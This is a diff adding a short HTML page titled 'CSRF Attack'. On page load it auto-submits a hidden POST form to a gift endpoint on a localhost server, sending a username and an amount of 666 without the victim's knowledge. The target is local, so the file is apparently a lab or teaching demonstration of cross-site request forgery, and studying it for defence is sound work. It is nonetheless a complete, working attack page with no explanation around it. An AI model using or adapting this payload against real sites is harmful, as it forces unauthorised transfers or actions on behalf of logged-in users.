@@ -1,0 +1,19 @@
+<!doctype html>
+
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+
+  <title>CSRF Attack</title>
+  
+  
+
+</head>
+
+<body onload="document.forms[0].submit()">
+    <form action = "http://127.0.0.1:8000/gift.html" id="Attack" method="POST">
+        <input type="hidden" name="username" value="test"/>
+        <input type="hidden" name="amount" value="666"/>
+    </form>
+</body>
+</html>
